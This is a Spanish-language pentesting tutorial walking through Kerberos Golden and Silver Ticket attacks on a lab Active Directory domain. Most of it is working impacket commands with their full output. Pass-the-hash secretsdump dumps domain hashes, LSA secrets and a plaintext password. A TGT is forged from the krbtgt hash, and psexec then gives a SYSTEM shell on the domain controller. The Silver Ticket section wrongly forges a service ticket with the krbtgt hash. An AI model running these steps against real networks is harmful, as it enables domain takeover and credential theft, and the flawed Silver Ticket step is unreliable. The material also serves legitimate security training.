---
icon: coin-front
---

# Kerberos Golden Ticket y Silver Ticket

Con esta tecnica lo que podemos hacer es montarnos nuestros propios `TGT's` y `Tickets` de servicio.

Lo que tendremos que hacer de primeras es obtener el `hash` del usuario `krbtgt` que es el que cifra con su clave privada los `TGT's` y demas informacion, por lo que tendremos que obtener unicamente su `hash` y se puede hacer de varias forma, una de ellas con una vulnerabilidad de `DCSync` como vimos anteriormente.

Si nosotros realizamos un volcado de la `SAM` como vimos anteriormente una vez obtenido del `hash` del `administrador` de dominio en `kali` de la siguiente forma:

```shell
impacket-secretsdump Administrator@192.168.5.5 -hashes :a87f3a337d73085c45f9416be5787d86
```

Info:

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x52d140c469db2c66b93d05a05f280802
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a87f3a337d73085c45f9416be5787d86:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
CORP\DC01$:aes256-cts-hmac-sha1-96:42e6d83a65fa4fc7246f8ee733d26121a49a9b7fb79f8c820486766930eb6b55
CORP\DC01$:aes128-cts-hmac-sha1-96:dc0559121ad2f325f3adfd4ef3a40810
CORP\DC01$:des-cbc-md5:980bdc04c4f2ea73
CORP\DC01$:plain_password_hex:d7da285f5194608f957b5ea6c42c3cb9b7322a82125103f7a1c9e8926f63716004b8cf98a473fc6d5e87ccf3709a600703b571c53e05e7c952d94591fa86f4fce21046672731b53a2a43a68b2a608b88319a00abb4491a030e35b96bdcd77e2488d1a4f34bc7083618a3275def0ae4d468cd39e619c1f92f11829e2e958bcdd80c141f00cc56a878999e388a6f8aa4af33082a2bf9f36eef139fb88ee2f5a1743b151c822055b9b39914bc0fbb7ef692dc390cbf1f2a38e6f6542108af129719edb900893bc04c436084a85ed03c66da05be935ac87d4fd2591a17c76d69b2f6f24d88dfa65a404fbe36d14f38ff5d5f
CORP\DC01$:aad3b435b51404eeaad3b435b51404ee:0a293c84079cceb0350201b4477561f3:::
[*] DefaultPassword 
CORP\Administrador:Passw0rd
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xecca8eedfcd9eb1bfaa4e03106e41206d125bdad
dpapi_userkey:0xbbeae8ca12481039a05a0bae4fd17749a41a6638
[*] NL$KM 
 0000   C5 03 54 75 59 68 1A 6B  F5 1E 14 E4 12 FA 5F F7   ..TuYh.k......_.
 0010   B1 99 A3 60 9A 96 3D 89  46 F9 ED E4 5C 54 4B 89   ...`..=.F...\TK.
 0020   81 FA 24 DD 83 BD 97 C6  21 04 ED 7D 69 CF 6E 3D   ..$.....!..}i.n=
 0030   65 AA 53 AA 53 7C 50 C9  F8 33 E2 C8 14 14 24 CC   e.S.S|P..3....$.
NL$KM:c503547559681a6bf51e14e412fa5ff7b199a3609a963d8946f9ede45c544b8981fa24dd83bd97c62104ed7d69cf6e3d65aa53aa537c50c9f833e2c8141424cc
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a87f3a337d73085c45f9416be5787d86:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3f6f27ccbcb235da4602454dff0efb47:::
empleado1:1104:aad3b435b51404eeaad3b435b51404ee:1791df33b45987df23e4fe6c57ea6de7:::
empleado2:1105:aad3b435b51404eeaad3b435b51404ee:8a499ecf99c5e069d0458e283a4b6e89:::
corp.local\maurine.bibby:1112:aad3b435b51404eeaad3b435b51404ee:d82921ed22040dd71155e8a03243313c:::
..............................<RESTO_CODIGO>.......................................
```

Vemos que hemos obtenido el `hash` del usuario que queremos:

```
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3f6f27ccbcb235da4602454dff0efb47:::
```

De todo esto el que nos va a interesar es el `hash NTLM` que seria el siguiente:

```
3f6f27ccbcb235da4602454dff0efb47
```

Ahora vamos a ejecutar el siguiente comando para montarnos nuestro propio `TGT` de la siguiente forma:

Pero claro antes deberemos de obtener el `SID` que es muy sencillito, con el modulo de `AD` en un equipo cualquiera lo podremos obtener, poniendo lo siguiente:

```powershell
Get-ADDomain
```

Info:

```
AllowedDNSSuffixes                 : {}
ChildDomains                       : {}
ComputersContainer                 : CN=Computers,DC=corp,DC=local
DeletedObjectsContainer            : CN=Deleted Objects,DC=corp,DC=local
DistinguishedName                  : DC=corp,DC=local
DNSRoot                            : corp.local
DomainControllersContainer         : OU=Domain Controllers,DC=corp,DC=local
DomainMode                         : Windows2016Domain
DomainSID                          : S-1-5-21-3352250647-938130414-2449934813
ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=corp,DC=local
Forest                             : corp.local
InfrastructureMaster               : DC01.corp.local
LastLogonReplicationInterval       :
LinkedGroupPolicyObjects           : {cn={410CF9DA-E128-4646-B131-688DF0C8538D},cn=policies,cn=system,DC=corp,DC=local,
                                      CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=corp,DC=local}
LostAndFoundContainer              : CN=LostAndFound,DC=corp,DC=local
ManagedBy                          :
Name                               : corp
NetBIOSName                        : CORP
ObjectClass                        : domainDNS
ObjectGUID                         : a72d122a-d459-40c5-a96b-8ef515bee704
ParentDomain                       :
PDCEmulator                        : DC01.corp.local
PublicKeyRequiredPasswordRolling   : True
QuotasContainer                    : CN=NTDS Quotas,DC=corp,DC=local
ReadOnlyReplicaDirectoryServers    : {}
ReplicaDirectoryServers            : {DC01.corp.local}
RIDMaster                          : DC01.corp.local
SubordinateReferences              : {DC=ForestDnsZones,DC=corp,DC=local, DC=DomainDnsZones,DC=corp,DC=local,
                                     CN=Configuration,DC=corp,DC=local}
SystemsContainer                   : CN=System,DC=corp,DC=local
UsersContainer                     : CN=Users,DC=corp,DC=local
```

Y con esto sabremos que el `SID` que nos inetersa es:

```
DomainSID   : S-1-5-21-3352250647-938130414-2449934813
```

Por lo que haremos lo siguiente:

```shell
impacket-ticketer -nthash 3f6f27ccbcb235da4602454dff0efb47 -domain-sid S-1-5-21-3352250647-938130414-2449934813 -domain corp.local Administrator
```

Info:

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
/usr/share/doc/python3-impacket/examples/ticketer.py:141: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  aTime = timegm(datetime.datetime.utcnow().timetuple())
[*] Customizing ticket for corp.local/Administrator
/usr/share/doc/python3-impacket/examples/ticketer.py:600: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  ticketDuration = datetime.datetime.utcnow() + datetime.timedelta(hours=int(self.__options.duration))
/usr/share/doc/python3-impacket/examples/ticketer.py:718: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  encTicketPart['authtime'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
/usr/share/doc/python3-impacket/examples/ticketer.py:719: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  encTicketPart['starttime'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
/usr/share/doc/python3-impacket/examples/ticketer.py:843: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  encRepPart['last-req'][0]['lr-value'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
[*]     EncAsRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncASRepPart
[*] Saving ticket in Administrator.ccache
```

Lo que estamos haciendo aqui es generar ese `TGT` del usuario `Administrador` con el `hash` del usuario `krbtgt` que obtuvimos.

Ahora lo que vamos hacer es generar un `TGS` a partir de este `TGT` que hemos generado de forma manual del usuario `Administrador` como vimos anteriormente.

```shell
export KRB5CCNAME=/home/kali/Administrator.ccache
impacket-psexec corp.local/Administrator@DC01.corp.local -k -no-pass
```

Info:

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on DC01.corp.local.....
[*] Found writable share ADMIN$
[*] Uploading file xefNbHJn.exe
[*] Opening SVCManager on DC01.corp.local.....
[*] Creating service OgZZ on DC01.corp.local.....
[*] Starting service OgZZ.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.1]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

Como vemos ha funcionado, sin necesidad de que se nos monte un `TGT`, lo hemos echo de forma manual y funciona perfectamente.

Esto que acabamos de ver es el `Golden Ticket`, pero ahora vamos a realizar la tecnica de `Silver Ticket`, que seria de la siguiente forma:

```shell
impacket-ticketer -nthash 3f6f27ccbcb235da4602454dff0efb47 -domain-sid S-1-5-21-3352250647-938130414-2449934813 -domain corp.local -spn cifs/DC01.corp.local Administrator
```

En este caso esta tecnica es para generar un `Ticket` de un servicio especifico que queremos utilizar en este caso `cifs` bajo el nombre del usuario `Administrador`.

Info:

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
/usr/share/doc/python3-impacket/examples/ticketer.py:141: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  aTime = timegm(datetime.datetime.utcnow().timetuple())
[*] Customizing ticket for corp.local/Administrator
/usr/share/doc/python3-impacket/examples/ticketer.py:600: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  ticketDuration = datetime.datetime.utcnow() + datetime.timedelta(hours=int(self.__options.duration))
/usr/share/doc/python3-impacket/examples/ticketer.py:718: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  encTicketPart['authtime'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
/usr/share/doc/python3-impacket/examples/ticketer.py:719: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  encTicketPart['starttime'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
/usr/share/doc/python3-impacket/examples/ticketer.py:843: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  encRepPart['last-req'][0]['lr-value'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in Administrator.ccache
```

Y ya con esto podremos utilizar el servicio sin necesidad de poner ninguna contraseña como hemos visto anteriormente.
